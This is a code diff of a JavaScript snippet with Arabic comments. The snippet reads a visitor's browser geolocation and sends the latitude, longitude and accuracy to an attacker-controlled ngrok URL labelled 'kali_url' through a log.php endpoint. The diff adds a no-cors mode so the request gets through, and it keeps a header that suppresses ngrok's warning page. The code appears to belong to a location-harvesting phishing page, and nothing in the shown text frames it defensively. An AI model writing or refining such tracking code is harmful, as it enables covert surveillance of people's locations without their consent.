@@ -21,12 +21,12 @@
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
 
-            // رابط Ngrok الجديد الخاص بك
+            // رابط Ngrok الجديد الخاص بك (تم التحديث)
             var kali_url = "https://finally-stumpier-jackelyn.ngrok-free.dev"; 
 
             fetch(kali_url + "/log.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc, {
+                mode: 'no-cors', // أضفنا هذا السطر لضمان وصول الطلب حتى لو فيه قيود CORS
                 headers: {
-                    // هذا السطر يمنع ظهور صفحة التحذير من ngrok ويرسل البيانات فوراً
                     "ngrok-skip-browser-warning": "true"
                 }
             })
